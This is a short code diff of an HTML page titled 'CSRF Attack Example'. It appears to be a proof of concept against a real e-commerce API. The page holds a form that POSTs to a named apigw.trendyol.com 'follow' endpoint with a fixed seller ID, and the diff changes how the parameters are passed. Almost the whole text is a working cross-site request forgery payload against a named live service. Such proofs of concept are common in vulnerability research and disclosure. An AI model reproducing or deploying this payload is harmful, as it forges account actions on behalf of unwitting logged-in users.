@@ -5,9 +5,7 @@
   <title>CSRF Attack Example</title>
 </head>
 <body>
-  <form id="csrfForm" action="https://apigw.trendyol.com/discovery-sellerstore-webgw-service/v1/follow/" method="POST">
-    <input type="hidden" name="sellerId" value="1066466">
-    <input type="hidden" name="channelId" value="1">
+  <form id="csrfForm" action="https://apigw.trendyol.com/discovery-sellerstore-webgw-service/v1/follow/?sellerId=1066466&channelId=1" method="POST">
   </form>
 
   <script>
